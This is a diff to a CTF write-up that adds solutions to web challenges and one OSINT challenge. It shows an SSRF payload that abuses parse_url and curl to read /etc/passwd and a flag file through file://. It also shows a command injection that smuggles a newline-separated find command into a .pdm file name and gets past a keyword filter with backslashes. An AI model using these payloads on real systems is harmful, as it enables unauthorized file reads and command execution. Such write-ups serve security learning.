@@ -4,18 +4,13 @@
 
 -------------------------------------------------------
 #### Web
-- [Web 200: You can't see me!](##Web200)
-- [Web 300: See Secret in Rootcon File](##Web300)
-- Web 400: PwnDeManila's Files
+- [Web 200: You can't see me!](#web200)
+- [Web 300: See Secret in Rootcon File](#web300)
+- [Web 400: PwnDeManila's Files](#web400)
 - Web 500: Guess The Number
 
-#### Misc
-- Misc 50: Boy XSS
-- Misc 50: Kill Switch
-- Misc 50: Black Badge Holder
-
 #### OSINT
-- OSINT 100: Hide and Seek
+- [OSINT 100: Hide and Seek](#osint100)
 
 ------------------------------------------------------
 
@@ -60,10 +55,13 @@ We see that they both return the same value (`pwndemanilaArray`) and will easily
 ![](2021-10-16_10-07.png)
 
 Related Writeups:
+
 https://rawsec.ml/en/angstromCTF-2018-write-ups/#140-md5-web
 https://tilak.tech/4/null-ahmedabad-ctf-prove-yourself-1337
 https://jaimelightfoot.com/blog/b00t2root-ctf-easyphp/
+
 -------------------------------------------------------
+
 ## Web300
 ![](2021-10-16_10-10.png)
 
@@ -80,21 +78,82 @@ The website presents us with a pretty funny image of sir atom who `drank all the
 Now we can review the source code. What striked my interest immediately are the following functions used with the `url` parameter that we provide: `parse_url` and `curl_exec`. But first, we need to properly analyze the code:
 
 ```php
-if(isset($_GET["url"])) { /* so we need to provide some url */
-	$parsed = parse_url($_GET["url"]);  /* runs the url against the parse_url function then stores the result in the variable $parsed */
-    if(!$parsed) {  /* error handling if we somehow f this up */
-        die("Sorry but I cannot parse your url: ".$_GET["url"]);  
-    }  
-    if(substr($_GET["url"], strlen("http://"), strlen("rootcon.org")) === "rootcon.org") {  /* checks if the domain is rootcon.org */
-        die("haxxor level 1 alert!");  
-    }  
-    if($parsed["port"] == 31337 && $parsed["host"] == "rootcon.org") { /* we need the parsed url to pass these checks */
-		$ch = curl_init(); 
-		curl_setopt ($ch, CURLOPT_URL, $_GET["url"]); 
-		curl_exec($ch); /* basically, curl $url : this might be a possible vector for ssrf */
-		curl_close($ch);  
-    }else{  
-        die("haxxor level 2 alert!");  
-    }  
+1 if(isset($_GET["url"])) { /* so we need to provide some url */
+2 	$parsed = parse_url($_GET["url"]);  /* runs the url against the parse_url function then stores the result in the variable $parsed */
+3    if(!$parsed) {  /* error handling if we somehow f this up */
+4        die("Sorry but I cannot parse your url: ".$_GET["url"]);  
+5    }  
+6    if(substr($_GET["url"], strlen("http://"), strlen("rootcon.org")) === "rootcon.org") {  /* checks if the url[7:11](domain) is rootcon.org; need to bypass this*/
+7        die("haxxor level 1 alert!");  
+8    }  
+9    if($parsed["port"] == 31337 && $parsed["host"] == "rootcon.org") {  /* we need the parsed url to pass these checks */
+10		$ch = curl_init(); 
+11		curl_setopt ($ch, CURLOPT_URL, $_GET["url"]); 
+12		curl_exec($ch); /* basically, curl $url : this might be a possible vector for ssrf */
+13		curl_close($ch);  
+14    }else{  
+15        die("haxxor level 2 alert!");  
+16    }  
+17 }
+```
+
+The plan is clear, we need curl to retrieve an internal file which in this case would be the flag. Keep the following things in mind:
+1. We can easily bypass the level 1 check (lines 6-7) by adding something before `rootcon.org`. Since we'll be retrieving a file, we will be using the `file://` protocol. 
+2. In addition to #1, we also need the url to have a host of `rootcon.org`, so an idea was to use credential format, e.g. `file://user@rootcon.org:31337`. When this is passed to `parse_url`, it identifies `rootcon.org` as the host then 31337 as the port which allows us to enter the block where curl is called. 
+
+```php
+php > $url = "file://user@rootcon.org:31337";
+php > var_dump(parse_url($url));
+array(4) {
+  ["scheme"]=>
+  string(4) "file"
+  ["host"]=>
+  string(11) "rootcon.org"
+  ["port"]=>
+  int(31337)
+  ["user"]=>
+  string(4) "user"
 }
 ```
+3. At this point, the payload isn't complete yet bc we haven't provided a file to retrieve. To test it out, I tried to read `/etc/passwd`. Hence the payload would be `file://user@rootcon.org:31337/etc/passwd`. Theoretically, it should be able to pass the needed checks and curl would return the file to us:
+![](2021-10-16_13-25.png)
+
+Now that we have successfully read the passwd file, we can retrieve the flag file which I guessed to be at `/flag` and it turned out to be correct (+ first blood):
+![](2021-10-16_13-27.png)
+
+Reference writeup:
+https://fireshellsecurity.team/sunshinectf-search-box/
+
+---------------------------------------------------
+
+## Web400
+![](2021-10-16_13-32.png)
+
+This challenge was a lot easier compared to the rest. We were given a link to a website which asks us for files that end with `.pdm` and it returns the md5 hash of the file. 
+
+![](2021-10-16_13-36.png)
+
+We were able to quickly recognize that it was the result of the `md5sum` command and deduced that if the input is not properly sanitized, then it could lead to arbitrary code injection. It did have some sort of sanitation mechanism, as we were only allowed to provide strings that ended with `.pdm`, however it was easily bypassed by Sir Chris (one of our team mates) by terminating the string with `%0A` then adding an arbitrary command afterwards:
+
+![](2021-10-16_13-46.png)
+
+However, it was not over as there were other checks in place to filter out which words we were using. For example, trying to use the following payload: `path=or10n.pdm%0Afind+/+-type+f+-name+"flag.*"+2>/dev/null` would result to the following "error" message: `Oh c'mon! Really?!`. Sir Chris suggested that a bypass to this was to add backslashes `\` which worked.
+
+![](2021-10-16_13-55.png)
+
+From there, it was just a matter of retrieving the flag:
+
+![](2021-10-16_13-56.png)
+
+---------------------------------------------------
+
+## OSINT100
+![](2021-10-16_14-07.png)
+
+Simply browse through the CTFTime PH leaderboard. My approach was to list the teams that hackstreetboys were a part of. My initial thoughts was to visit `Antivirus`'s profile which was actually Sir Ameer. 
+
+![](2021-10-16_14-10.png)
+
+From here, the only way things could be hidden was through his profile descriptions/links and writeups. But none were found. So I decided to browse wayback machine to see if there were changes made beforehand. 
+
+![](2021-10-16_14-13.png)
